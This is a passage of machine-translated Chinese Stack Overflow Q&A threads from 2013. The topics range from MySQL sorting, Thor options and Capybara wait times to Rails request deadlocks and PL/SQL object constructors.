但是，这只会避免人们进行热链接，而不是访问您的内容。因此，如果安全是一个问题。看看 Apache 的[`mod_auth_basic`](http://httpd.apache.org/docs/2.4/mod/mod_auth_basic.html) .

# php - 如何按两列对 MySQL 进行排序？

> ID：14346277
> 
> 赞同：1
> 
> 时间：2013-01-15T20:28:30.550
> 
> 标签：php, mysql, sql, sorting

我和几个朋友创建了一个音乐博客，并创建了一个 MySQL 表来跟踪帖子浏览量。我有一栏跟踪管理员视图，一栏跟踪每个帖子的用户视图。

我正在制作一个页面，以便按大多数管理员视图、大多数用户视图和总视图轻松查看和排序。我没有在我的 MySQL 数据库中为“总视图”创建一列（为了计算，我只是将管理视图添加到用户视图中。简单明了）。

我可以通过查询轻松地按管理视图排序，`SELECT * FROM log ORDER BY ADMIN DESC`对于用户视图也是如此，但是有没有一种简单的方法来做类似的事情`SELECT * FROM log ORDER BY ADMIN + USER DESC`？如果没有，我将不得不弄乱我的代码来提供我自己的排序算法。

提前谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:31:12.087

查询与您所说的完全相同：

```
SELECT  *
FROM    log
ORDER BY
        admin + user DESC 
```

如果您为总视图创建了一个单独的列并将其编入索引，则可以在查询中使用它：

```
SELECT  *
FROM    log
ORDER BY
        total_views DESC
LIMIT   10 
```

这将提高`SELECT`有限查询的速度。按照您的操作方式，应该扫描并排序整个表格，即使您只选择前 10 条评论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:41:02.097

如果您打算将总视图用于除排序之外的任何内容，我建议：

```
SELECT *,(`admin`+`user`) as `total` FROM `log` ORDER BY `total` DESC 
```

这将为您的结果添加一个“总计”字段，您可以在计算中显示或使用该字段。

# ember.js - 如何将多个模板渲染成一个模板并为这些模板设置模型？

> ID：14346281
> 
> 赞同：2
> 
> 时间：2013-01-15T20:28:39.240
> 
> 标签：ember.js, ember-data

我有一个模板，它呈现另外两个模板`dashboard/panelOne`和`dashboard/panelTwo`. 它呈现每个模板，但数据永远不会绑定到控制器。我假设 renderTemplate 正在跳过执行此操作的路线。您会注意到，如果单击“转到第一面板”或“转到第二面板”链接之一并单击后退按钮，则数据现在已填充到仪表板上。

我正在使用 Master 的 EmberJS：

版本：v1.0.0-pre.2-396-gddb0951

上次提交：ddb0951 (2013-01-14 10:16:46 -0800)

如何将数据放入面板的控制器并填充数据，使其显示在仪表板上，而无需先进入每个面板？

[这是我工作的 JSFiddle。](http://jsfiddle.net/seankeating/yrsGu/43/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:38:27.500

问题是您依赖面板路由为您生成控制器。但是，这个控制器是惰性创建的，内容只能通过该`model`函数从面板路由中设置。相反，您应该只声​​明控制器并提前在其上设置内容。见[http://jsfiddle.net/yrsGu/49/](http://jsfiddle.net/yrsGu/49/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T00:15:34.717

到目前为止，我还没有找到一个我认为应该的解决方案。为了避免为我的面板制作控制器和路由，我需要保留 Route 定义，然后在 DashboardIndexRoute 中定义 renderTemplates 的位置，我以这种方式定义它：

```
this.render('dashboard/panelOne', {
    into: 'dashboard.index',
    outlet: 'panelOne',
    controller: this.controllerFor('dashboard/panelOne', App.Sites.find())
}); 
```

这将创建控制器并为我注入模型。这也允许定义模板将采用的模型。因此，如果我想制作更多模板（因为我喜欢模板）并重用面板模板但使用不同的模型，这将成为可能。

以彼得的回答为例。它假定每次调用面板时模型都是相同的。在某些情况下可能会起作用，如果模型相同并且面板在多个位置重复使用，则效果会更好。

[这是最新的 JSFiddle。](http://jsfiddle.net/seankeating/yrsGu/52/)

我暂时保留这个问题，看看其他人是否有其他解决方案。

# ruby - 如何让两个雷神任务共享选项？

> ID：14346285
> 
> 赞同：12
> 
> 时间：2013-01-15T20:28:53.553
> 
> 标签：ruby, thor

Thor 可以[`method_option`](https://github.com/wycats/thor/wiki/Method-Options)用来设置特定任务的选项。要为一个类中的所有任务设置选项，可以使用`class_option`. 但是，如果一个人想要一个类的一些任务，但不是全部，共享选项呢？

在下文中`task1`，和`task2`共享期权，但他们不共享所有期权，也不与 共享期权`task3`。

```
require 'thor'

class Cli < Thor
  desc 'task1', 'Task 1'
  method_option :type, :type => :string, :required => true, :default => 'foo'
  def task1
  end

  desc 'task2', 'Task 2'
  method_option :type, :type => :string, :required => true, :default => 'foo'
  method_option :value, :type => :numeric
  def task2
  end

  desc 'task3', 'Task 3'
  method_option :verbose, :type => :boolean, :aliases => '-v'
  def task3
  end
end

Cli.start(ARGV) 
```

声明`method_option :type, :type => :string, :required => true, :default => 'foo'`两者`task1`的问题`task2`是它违反[了 DRY 原则](http://en.wikipedia.org/wiki/Don%27t_repeat_yourself)。有没有一种惯用的方法来处理这个？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-16T14:23:23.883

`method_option`在[thor.rb](https://github.com/wycats/thor/blob/1f91d12fce7aef74028e2423e991c6c34036d731/lib/thor.rb#L81-L114)中定义，根据文档它采用以下参数：

*   `name<Symbol>::`参数的名称。
*   `options<Hash>::`如下面所描述的。

知道了这一点，您可以将参数存储`method_option`在一个数组中，[并将该数组扩展为单独的参数](http://www.ruby-doc.org/docs/ProgrammingRuby/html/tut_methods.html#UC)，就像`method_option`调用的那样。

```
require 'thor'

class Cli < Thor
  shared_options = [:type, {:type => :string, :required => true, :default => 'foo'}]

  desc 'task1', 'Task 1'
  method_option *shared_options
  def task1
  end

  desc 'task2', 'Task 2'
  method_option *shared_options
  method_option :value, :type => :numeric
  def task2
  end

  desc 'task3', 'Task 3'
  method_option :verbose, :type => :boolean, :aliases => '-v'
  def task3
  end
end

Cli.start(ARGV) 
```

我不知道这是否是惯用的，我认为它不是那么优雅。不过，这比违反 DRY 原则要好。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T22:02:57.390

我只会使用这样的超类：

```
require 'thor'

class CliBase < Thor
  def self.shared_options

    method_option :verbose,
                  :aliases => '-v',
                  :type => :boolean,
                  :desc => 'Verbose',
                  :default => false,
                  :required => false

  end
end 
```

...然后子类如下：

```
require 'cli_base'

class Cli < CliBase
  desc 'task1', 'Task 1'
  shared_options
  def task1
  end

  desc 'task2', 'Task 2'
  shared_options
  method_option :value, :type => :numeric
  def task2
  end

  desc 'task3', 'Task 3'
  method_option :colors, :type => :boolean, :aliases => '-c'
  def task3
  end
end

Cli.start(ARGV) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-03-15T23:30:05.740

所以现在有一个很好的干方法可以做到这一点，但可能不属于**惯用**的要求，尽管我想为任何寻找更新答案的人提一下。

您可以首先使用 class_options 设置方法之间的大多数共享选项：

```
module MyModule
  class Hello < Thor
    class_option :name, :desc => "name", :required => true
    class_option :greet, :desc => "greeting to use", :required => true

    desc "Hello", "Saying hello"
    def say
      puts "#{options[:greet]}, #{options[:name]}!"
    end

    desc "Say", "Saying anything"
    remove_class_option :greet
    def hello
      puts "Hello, #{options[:name]}!"
    end

    def foo
      puts "Foo, #{options[:name]}!"
    end
  end
end 
```

最好的部分是它适用于声明后的所有方法。将这些设置为 required 后，您可以看到第一个方法同时需要*greet*和*name*，但**say**和**foo**只需要名称。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-07-18T16:20:56.613

我遇到了同样的问题，我使用了 NN 的回答。但是我发现了一些问题：

如果您想像示例中那样共享多个选项，则效果不佳。想象一下，您想`:value`在 task2 和 task3 之间共享。您可以创建另一个`shared_options`，也可以使用共享选项创建一个数组并使用 shared_option 名称访问它。

这可行，但它很冗长且难以阅读。我已经实现了一些小东西，以便能够共享选项。

```
Cli < Thor  
  class << self
      def add_shared_option(name, options = {})
        @shared_options = {} if @shared_options.nil?
        @shared_options[name] =  options
      end

      def shared_options(*option_names)
        option_names.each do |option_name|
          opt =  @shared_options[option_name]
          raise "Tried to access shared option '#{option_name}' but it was not previously defined" if opt.nil?
          option option_name, opt
        end
      end
    end
    #...commands 
end 
```

这将创建一个以选项名称作为键的散列，并将“定义”（必需、默认等）作为值（这是一个散列）。这在之后很容易访问。

有了这个，您可以执行以下操作：

```
require 'thor'

class Cli < Thor

  add_shared_option :type,  :type => :string, :required => true, :default => 'foo'
  add_shared_option :value, :type => :numeric

  desc 'task1', 'Task 1'
  shared_options :type
  def task1
  end

  desc 'task2', 'Task 2'
  shared_options :type, :value
  def task2
  end

  desc 'task3', 'Task 3'
  shared_options :value
  def task3
  end
end

Cli.start(ARGV) 
```

对我来说，它看起来更具可读性，如果命令的数量大于 3 或 4，这是一个很大的改进。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-04-05T18:59:39.350

为了不一直输入“shared_options”，你也可以这样做：

```
require 'thor'

class Cli < Thor
  class << self
    private
    def shared_options!
      # list your shared options here
      method_option :opt1, type: :boolean
      method_option :opt2, type: :numeric
      # etc
    end

    # alias original desc so we can call it from inside new desc
    alias_method :orig_desc, :desc

    # redefine desc, calling original desc, and then applying shared_options!
    def desc(*args)
      orig_desc(*args)
      shared_options!
    end
  end

  desc 'task1', 'Task 1'

  def task1
  end

  desc 'task2', 'Task 2'

  def task2
  end

  desc 'task3', 'Task 3'

  def task3
  end
end 
```

或者，如果您不想使用方法别名的杂技，您可以定义自己的方法“my_desc”并调用它而不是“desc”。

# image - IE 显示损坏的图像，“显示图像”使它们显示正常

> ID：14346290
> 
> 赞同：0
> 
> 时间：2013-01-15T20:29:11.377
> 
> 标签：image, internet-explorer, brokenimage

在此站点上：[http](http://wyattorr.reuniondesign.com/collections/spring-2013) ://wyattorr.reuniondesign.com/collections/spring-2013 Internet Explorer 间歇性地显示损坏的图像。我第一次加载页面时，大部分图像都加载得很好，但是在随后的加载中，所有图像都显示为损坏。如果我右键单击并选择“显示图像”，则图像显示完全正常。

可能的问题：我正在使用加载的 jquery 插件图像，这可能与它有关吗？您会认为这只会使图像隐藏...

有趣的注释：损坏的图像以正确的尺寸显示，这意味着它们已经加载并且 IE 知道它们的尺寸。

我在我的 IE 专业知识的尽头......有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-21T17:32:59.833

为此加载的图像中有一个[打开的错误](https://github.com/desandro/imagesloaded/issues/40)。

但是，我在不使用 imagesloaded 的情况下也看到了这个问题。就像您的情况一样，IE 中存在图像损坏的间歇性问题（所有其他主要浏览器都很好）。事实证明，服务器提供的图像没有内容类型的标头，当重新配置以提供正确的标头时，问题就消失了。

错误的标头似乎暴露了 IE 启动和中止加载图像的方式的潜在问题（这种行为似乎也是导致图像加载错误的原因）。[IE 尝试使用前瞻预解析器](http://blogs.msdn.com/b/ieinternals/archive/2011/07/18/optimal-html-head-ordering-to-avoid-parser-restarts-redownloads-and-improve-performance.aspx)来加速页面加载，该预解析器在主解析器有机会之前先发制人地请求图像。有时 IE 会[停止并重新启动](https://stackoverflow.com/questions/11095319/how-fix-document-mode-restart-in-ie-9)解析过程。

发生这种情况时，IE 会中止预解析器的图像下载。根据时间的不同，它显然并不总是重新开始下载，或者不会使用完全下载的图像更新页面，从而导致图像损坏（至少在图像缺少内容类型标题的情况下）。其他浏览器没有这个问题，即使图像缺少内容类型标题。

采取措施[防止文档模式重新启动](https://stackoverflow.com/questions/11095319/how-fix-document-mode-restart-in-ie-9)并确保服务器正确设置图像的内容类型标题可能会有所帮助。

# mysql - MySql将少量数据从一台服务器上的每个表复制到另一台服务器

> ID：14346292
> 
> 赞同：1
> 
> 时间：2013-01-15T20:29:13.560
> 
> 标签：mysql, copy

我有一个新的数据库设置，它与另一个充满数据的数据库非常相似。我想知道是否有办法将每个表中的 10 条记录复制到新数据库中。我正在创建一些网络报告，并想要一些“虚拟”数据来了解事情是如何运作的。我已经看到了一些从某些表中导出数据并将它们导入新数据库的方法，但是我有大约 50 个表要复制，这将非常耗时。有没有一种希望简单的:)方法来实现这一点？对不起，如果这令人困惑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:34:55.617

从您的终端，您可以使用`mysqldump`从选定的表中导出数据：

```
mysqldump -u<username> -p<password> <database> <tabel1> <table2> <table3> > dump.sql 
```

然后将它们导入您的其他数据库：

```
mysql -u<username> -p<password> <database> < dump.sql 
```

# google-app-engine - 增量更新 google blobstore 或云存储？

> ID：14346295
> 
> 赞同：2
> 
> 时间：2013-01-15T20:29:21.483
> 
> 标签：google-app-engine, blobstore, google-cloud-storage

我正在开发一个应用程序，用户将在其中创建一个数据对象并将其上传到存储中。然后他们稍后会下载它，进行一些更改，然后上传这些更改（作为原始数据的补丁）。有没有办法使用 blobstore 或云存储来上传补丁并应用它，这样我的用户就不必再次上传整个数据对象（可能会变得非常大）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:52:58.970

您不能对 Blobstore 或 Cloud Storage 中的数据发出增量更新。要应用补丁，您必须自己应用它并覆盖 blob 或对象中的数据。相关信息如下。

来自Google Cloud Storage 文档的[概念和术语部分：](https://developers.google.com/storage/docs/reference/v1/getting-startedv1#intro)

> 对象是不可变的，这意味着上传的对象在其存储生命周期内不能更改。对象的存储生命周期是成功创建（上传）对象和成功删除对象之间的时间。实际上，这意味着您不能对对象进行增量更改，例如追加操作或截断操作。但是，可以覆盖存储在 Google Cloud Storage 中的对象，因为覆盖操作实际上是删除对象操作，然后是上传对象操作。因此，一次覆盖操作只是标志着一个不可变对象生命周期的结束和一个新不可变对象生命周期的开始。

从[Blobstore 介绍部分](https://developers.google.com/appengine/docs/python/blobstore/overview#Introducing_the_Blobstore)：

> Blob 在创建后无法修改，但可以删除。每个 blob 都有一个相应的 blob 信息记录，存储在数据存储中，提供有关 blob 的详细信息，例如其创建时间和内容类型。您可以使用 blob 键来获取 blob 信息记录并查询它们的属性。

# java - 操作活动堆栈以返回主屏幕

> ID：14346297
> 
> 赞同：0
> 
> 时间：2013-01-15T20:29:25.527
> 
> 标签：java, android

Activity A 是我的主屏幕，用户可以在其中导航到 B、C、D。所以在正常情况下，用户会从 A 创建 Activity B，堆栈看起来像 A->B。从 B 按下返回会将您带回 A。

我为活动B（用于NFC）设置了另一个意图，以便在特殊情况下可以直接启动B。在这种情况下，按返回只会让我回到主屏幕。我需要后退按钮将用户带回主要活动 (A)。

如何通过直接操作堆栈来完成此操作？如果这不可能，最好的选择是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:34:54.493

在你的意图中使用额外的活动 A 来传递调用者的“名称”，然后在离开活动时检查这些意图，并为主要活动创建一个新的意图，或者让它相应地停止。

在Activity A中，调用B时：

```
Intent intent = new Intent(this, ActivityB.class);
intent.putExtra("caller", "ActivityA");
startActivity(intent); 
```

在活动 B 中：

```
String caller = getIntent().getStringExtra("caller"); 
```

停止活动 B 时，如果调用者不是 ActivityA，则启动它。

```
if(!caller.equals("ActivityA")) {
   Intent intent = new Intent(this, ActivityA.class);
   startActivity(intent);
} 
```

# performance - 如何计算 GPU 程序的加速比？

> ID：14346301
> 
> 赞同：16
> 
> 时间：2013-01-15T20:29:41.197
> 
> 标签：performance, cuda, gpgpu, metrics

**动机：**我的任务是测量我的 CUDA C 代码的[Karp-Flatt 度量](http://en.wikipedia.org/wiki/Karp%E2%80%93Flatt_metric)和[并行效率](http://en.wikipedia.org/wiki/Parallel_efficiency)，这需要计算加速。特别是，我需要将所有这些指标绘制为处理器数量的函数*`p`*。

**定义：** [加速](http://en.wikipedia.org/wiki/Speedup)比是指并行算法比相应的顺序算法快多少，定义为：

![在此处输入图像描述](../Images/5002f9b9b8ce0a341dd6913b26cad277.png)

**问题：**我已经在**CUDA C**中实现了我的算法，并已将其计时为 get *`Tp`*。但是，在确定中仍然存在一些问题*`Sp`*：

*   如何在*`T1`*不从头开始完全重写我的代码的情况下进行观察？
    *   我可以串行执行CUDA代码吗？？？
*   *`p`*当我使用不同数量的线程运行不同的内核时 会发生什么？
    *   是不是指没有。线程或没有。整个运行时使用的处理器数量？
    *   由于这两个量在整个运行期间也会发生变化，它是使用的最大值还是平均值？
    *   我什至如何限制我的代码在处理器子集或更少线程上运行！？

非常感谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-15T21:06:47.173

要获得合理的加速度量，您需要*实际的顺序程序*。如果您没有，则需要编写最好的顺序版本，因为将高度优化的并行代码与垃圾串行实现进行比较是不合理的。

您也不能合理地将并行程序的 1 处理器版本与 N 处理器版本进行比较，以获得真正的加速度量。这样的比较告诉您从 P=1 到 P=N 对于同一程序的加速，但加速曲线的重点是说明为什么构建并行程序（这通常更难，并且需要更复杂的硬件 [GPU] 和工具 [OpenCL]) 与使用更广泛可用的硬件和工具编写最佳顺序版本相比更有意义。

换句话说，没有作弊。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-19T22:48:55.130

在测量加速比时，在大多数情况下，您必须从头开始完全编写串行和并行算法。没有特别的理由表明 P=1 的最佳并行算法与最佳串行算法有任何共同之处。在大多数情况下，并行算法必须做很多额外的工作，并且与最佳串行算法相比效率很低。

# asp.net - 带有 SQL Server 的 Signalr

> ID：14346303
> 
> 赞同：3
> 
> 时间：2013-01-15T20:29:52.797
> 
> 标签：asp.net, sql-server, signalr

我刚刚了解 signalr，我试图找出有什么方法可以直接从 sql server 获取通知。我无法在互联网上找到它的一个例子。*虽然，我在githhub*上了解了signalr.sqlserver ，但再次强调，互联网上没有使用 sql server 的 signalr 的工作示例。任何人都可以指导我的教程吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:32:57.480

正如这里所解释的

[SignalR sqlServer 监听](https://stackoverflow.com/questions/12810002/signalr-sqlserver-listening)

> 这是在 SQL Server 之上实现 SignalR 的 IMessageBus。

所以不，您不使用 SQL Server 本身的 SignalR，它是一个基于 Web 的工具。

# ruby-on-rails - 当我尝试升级到 Rails 3.2.11 时出现 gem“railties”问题

> ID：14346306
> 
> 赞同：1
> 
> 时间：2013-01-15T20:29:58.007
> 
> 标签：ruby-on-rails, ruby-on-rails-3, bundler

我正在尝试从 Rails 3.1.10 升级到 3.2.11，并且在运行 bundle install 时遇到了这个问题：

```
Bundler could not find compatible versions for gem "railties":
  In Gemfile:
    sass-rails (= 3.1.4) ruby depends on
      railties (~> 3.1.0) ruby

    rails (= 3.2.11) ruby depends on
      railties (3.2.11) 
```

这里发生了什么？我不明白 railties gem 是什么，因为它没有在我的 Gemfile 中列出，所以我不确定是否应该在我的 Gemfile 中明确地写一行。

这是我的 Gemfile：

```
source 'http://rubygems.org'

gem 'rake', '0.8.7'
gem 'rails', '3.2.11'

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails', "3.1.4"
  gem 'coffee-rails', "~> 3.1.0"
  gem 'uglifier'
  gem 'asset_sync'
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:38:02.427

railties 是 - Rails 内部：应用程序启动、插件、生成器和 rake 任务。来自[ruby​​gems 网站](http://rubygems.org/gems/railties)。

它的运行时依赖项是

*   动作包 = 3.2.11
*   主动支持 = 3.2.11
*   机架 SSL ~> 1.3.2
*   耙子 >= 0.8.7
*   rdoc ~> 3.4
*   雷神 < 2.0, >= 0.14.6

问题是您已将 sass-rails gem 指定为 3.1.4 版本，这取决于不在 rails 3.2.11 中的旧版本 railties 新版本的 sass-rails 3.2.6 将适用于新版本铁轨（和铁轨）。

# ruby-on-rails - Ruby on Rails 环回请求导致死锁？

> ID：14346311
> 
> 赞同：5
> 
> 时间：2013-01-15T20:30:07.357
> 
> 标签：ruby-on-rails, thin, unicorn

**解决方案**

我正在开发模式下切换到独角兽。每一级递归都需要一个工作进程来防止死锁情况，所以我正在运行 2 个工作进程。

**问题**

我正在开发环境中的[瘦](http://code.macournoyer.com/thin/)服务器上工作。我使用端口 3000（开发环境中的默认端口）。我的问题是让服务器向自己发出请求。

假设我有以下控制器：

```
# app/controllers/recursions_controller.rb
class RecursionsController < ApplicationController

    # /recursions
    def index

        # synchronously call recursions#show
        RestClient.get("http://localhost:3000/recursions/1") 

        # finish!
        render :text => 'index'

    end

    # /recursions/:id
    def show

        # finish immediately
        render :text => 'show'

    end

end 
```

下面是对应的路线：

```
# config/routes.rb
resources :recursions 
```

这是我最初请求时请求日志的输出`recursions#index`：

```
[INFO] 2013-01-15 12:09:05 -0800 Started GET "/recursions" for 127.0.0.1 at 2013-01-15 12:09:05 -0800
Processing by RecursionsController#index as HTML
Completed 500 Internal Server Error in 60049ms

[FATAL] 2013-01-15 12:10:05 -0800 RestClient::RequestTimeout (Request Timeout):
  app/controllers/recursions_controller.rb:8:in `index'
  Rendered /usr/local/lib/ruby/gems/1.9.1/gems/actionpack-3.2.11/lib/action_dispatch/middleware/templates/rescues/_trace.erb (0.8ms)
  Rendered /usr/local/lib/ruby/gems/1.9.1/gems/actionpack-3.2.11/lib/action_dispatch/middleware/templates/rescues/_request_and_response.erb (0.7ms)
  Rendered /usr/local/lib/ruby/gems/1.9.1/gems/actionpack-3.2.11/lib/action_dispatch/middleware/templates/rescues/diagnostics.erb within rescues/layout (7.4ms)

[INFO] 2013-01-15 12:10:05 -0800 

[INFO] 2013-01-15 12:10:05 -0800 

[INFO] 2013-01-15 12:10:05 -0800 Started GET "/recursions/1" for 127.0.0.1 at 2013-01-15 12:10:05 -0800
Processing by RecursionsController#show as XML
  Parameters: {"id"=>"1"}
  Rendered text template (0.0ms)
Completed 200 OK in 7ms (Views: 5.5ms) 
```

我怀疑这里发生的事情是某种僵局情况。在请求 B 返回之前，请求 A 无法返回（递归排序，无能为力），但在请求 A 返回之前无法处理请求 B（我的网络服务器中内置了明显的限制？）。当 RestClient 超时时，死锁被解决，导致异常并以 500 终止请求 A。只有这样才能处理请求 B，尽管此时它还没有实际意义。

在我看来，我的网络服务器无法处理并发请求。也就是说，这是我的问题：

1.  我的开发环境中是否可以切换到不受这种限制的网络服务器？我们在生产环境中使用 Unicorn，它可以产生多个工作进程并因此处理并发请求，但 Unicorn 对于开发环境来说似乎太重了。使 Unicorn 成为我的问题的解决方案的同一件事可能会使读取日志输出变得困难。这是我最后的解决方案。

2.  是否有一种巧妙的方法可以绕过明显的并发请求限制来向 Rails/Rack 框架发出请求？

3.  任何人都可以向我提供明确说明此限制的文档吗？我不知道这是否是所有单进程 Ruby on Rails 网络服务器固有的限制，或者只是 Thin。

**注意：**这只是一个演示我遇到的阻塞问题的玩具问题。如果你想知道这个的真正原因，那是我将一些 HTTP 服务从我们基础设施的另一部分移动到我们的 RoR 应用程序中。我们的 RoR 应用程序在代码中的许多不同点使用这些服务，所以我试图让这些服务的客户端代码保持不变，只更改实现。这意味着发出循环 HTTP 请求。这将在以后一切稳定后进行优化。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:57:45.660

您是正确的，默认情况下您的应用一次只会处理一个请求。这个限制是由`Rack::Lock`中间件实现的——无论你使用什么网络服务器，它都会存在。

您可以通过调用`config.thread_safe!`适当的 environment.rb 文件来更改它。然而，rails 的开发模式代码重新加载不是线程安全的，并且被此设置禁用，这使得它在开发中无法真正使用。究竟是什么config.thread_safe！确实在[rails 配置指南](http://guides.rubyonrails.org/configuring.html#rails-general-configuration)中进行了描述。

乘客、战俘、独角兽都可以轻松运行多个实例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:38:56.830

我和我的一位客户遇到了这个确切的问题。正如您所描述的那样 - 由于您正在运行一个只有一个进程的单线程网络服务器，因此您一次只能使用 1 个客户端。如果您发出第二个请求，或者实际上是一个环回请求，则您的第二个请求将由操作系统排队，直到第一个超时。

切换到独角兽并不能从本质上解决问题，尽管在我们的例子中，我们是在独角兽上，我们只是将工人数量增加到“2”。我对瘦不够熟悉，无法推荐如何增加工人数量，但毫无疑问有办法。否则，请使用独角兽 - 如果您进行切换，您还将获得更好的开发/产品平价，所以这可能是值得的。

# java - Main.xml 未更新

> ID：14346312
> 
> 赞同：0
> 
> 时间：2013-01-15T20:30:08.293
> 
> 标签：java, android, xml, view

有人可以快速查看我的 main.xml 代码并确保我没有犯任何愚蠢的错误吗？它没有显示任何这些。它正在显示旧的 main.xml。我保存了它，重新启动了 Eclipse，但它不会显示新代码。每当我运行代码时，它都会告诉我我的代码中有错误。但它不显示错误，并且在第二次运行时运行旧版本。

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/Main"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="#FFFFFF" >

<ImageView
    android:id="@+id/imageView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_alignParentTop="true"
    android:src="@drawable/PixLogo" />

<Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentLeft="true"
    android:layout_marginBottom="50dp"
    android:layout_marginLeft="30dp"
    android:text="Take Photo" />

</RelativeLayout> 
```

我正在调用 ImageView 和 Button onCreate。但它不会显示新的更改（徽标图像、按钮文本、背景颜色）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:35:12.573

如果有错误，它应该显示在问题视图中。请确保您的项目设置为自动构建

对于问题视图 - 转到 Windows - 显示视图 - 其他 - 常规 - 问题

# capybara - 多个 Capybara 等待时间？

> ID：14346314
> 
> 赞同：49
> 
> 时间：2013-01-15T20:30:10.540
> 
> 标签：capybara

我想`Capybara`在我的代码中有不同的等待时间，这取决于它们通常需要多少时间才能完全加载？我是否必须重复不断地更改`Capybara.default_wait_time`或者有更好的方法？

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2013-01-15T21:35:45.023

您可以使用[using_wait_time(seconds)](http://rubydoc.info/github/jnicklas/capybara/Capybara.using_wait_time)方法，例如：

```
using_wait_time 3 do
  expect(page).to have_text 'Lorem ipsum'
end 
```

或`:wait`选项（出现在 Capybara 2.1 中）。

请注意，仅Capybara 2.1 中`:wait`的方法支持该选项。`find`

`:wait`Capybara 2.2 中添加了对匹配器中的选项（即`has_x?`和`have_x`方法）的支持：

```
expect(page).to have_text('Lorem ipsum', wait: 3) 
```

# oracle - PL/SQL 对象组合：对象实例化/构造函数的问题

> ID：14346315
> 
> 赞同：1
> 
> 时间：2013-01-15T20:30:15.000
> 
> 标签：oracle, oop, plsql, object-composition

这是对是否可以在 PL/SQL 中使用对象组合的后续问题[？](https://stackoverflow.com/questions/14322711/is-it-possible-to-use-object-composition-in-pl-sql/14323374#14323374)

该问题解决了如何在 PL/SQL 中创建相互依赖的对象类型（即每个对象的一个​​属性是对另一个对象的引用）。

我遇到的下一个问题与对象构造函数有关。这是代码（从逻辑上讲，学生存在于人体内）。此外，只是为了在评论中排除这一点，使用继承不是我的选择。

**人物对象**

```
CREATE OR REPLACE TYPE PERSON FORCE AUTHID DEFINER UNDER MYSCHEMA.BASE_OBJECT (
    student MYSCHEMA.student,
    additional attributes...

    CONSTRUCTOR FUNCTION PERSON
    RETURN SELF AS RESULT

) NOT FINAL; 

CREATE OR REPLACE TYPE BODY PERSON
AS
    CONSTRUCTOR FUNCTION PERSON
    RETURN SELF AS RESULT IS

    BEGIN
        self.student := NEW MYSCHEMA.STUDENT(self);
        RETURN;
    END;
END; 
```

**学生对象**

```
CREATE OR REPLACE TYPE STUDENT FORCE AUTHID DEFINER UNDER MYSCHEMA.BASE_OBJECT (
    person REF MYSCHEMA.PERSON,

    CONSTRUCTOR FUNCTION STUDENT(p_person REF MYSCHEMA.PERSON)
    RETURN SELF AS RESULT

) NOT FINAL; 

CREATE OR REPLACE TYPE BODY STUDENT
AS

    CONSTRUCTOR FUNCTION STUDENT(p_person REF MYSCHEMA.PERSON)
    RETURN SELF AS RESULT IS

    BEGIN
        self.person := p_person;
        RETURN;
    END;
END; 
```

除了在 PERSON 构造函数中实例化 PERSON 中的 STUDENT 对象的以下行之外，此代码将编译而不会出现任何错误：

```
self.student := NEW MYSCHEMA.STUDENT(self); 
```

这会引发以下错误：

```
Error(22,29): PLS-00306: wrong number or types of arguments in call to 'STUDENT' 
```

所以，亲爱的朋友们，我再次寻求你们的帮助。我猜测有一个附加参数被隐式传递给 STUDENT 构造函数，但这只是一个猜测。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T06:17:35.763

[A`REF`必须引用一行。](http://docs.oracle.com/cd/E11882_01/appdev.112/e11822/adobjint.htm#i458258) 你不能通过`SELF`，因为它不是参考。

完成这项工作的一种方法是创建一个隐藏表：

```
create table shadow_person of person; 
```

每个实例都会在该表中创建一行：

```
CONSTRUCTOR FUNCTION PERSON
RETURN SELF AS RESULT IS
    v_ref_person ref person;
BEGIN
    insert into shadow_person values(self)
    returning make_ref(shadow_person, object_id) into v_ref_person;

    self.a_student := new student(v_ref_person);

    RETURN;
END; 
```

这似乎可行，但可能具有非常可怕的副作用，在真实的生产环境中没有人想要。

这是完整的脚本：

```
drop type base_object force;
drop type student force;
drop type person force;
drop table shadow_person;

create or replace type base_object is object (a varchar2(10)) not final;
/

CREATE OR REPLACE TYPE PERSON FORCE AUTHID DEFINER UNDER BASE_OBJECT (
    b varchar2(10),
    CONSTRUCTOR FUNCTION PERSON RETURN SELF AS RESULT
) NOT FINAL; 
/

CREATE OR REPLACE TYPE STUDENT FORCE AUTHID DEFINER UNDER BASE_OBJECT (
    c varchar2(10),
    a_person REF PERSON,
    CONSTRUCTOR FUNCTION STUDENT(p_person ref PERSON) RETURN SELF AS RESULT
) NOT FINAL; 
/

alter type person add attribute a_student student cascade;

create table shadow_person of person;

CREATE OR REPLACE TYPE BODY PERSON
AS
    CONSTRUCTOR FUNCTION PERSON
    RETURN SELF AS RESULT IS
        v_ref_person ref person;
    BEGIN
        insert into shadow_person values(self)
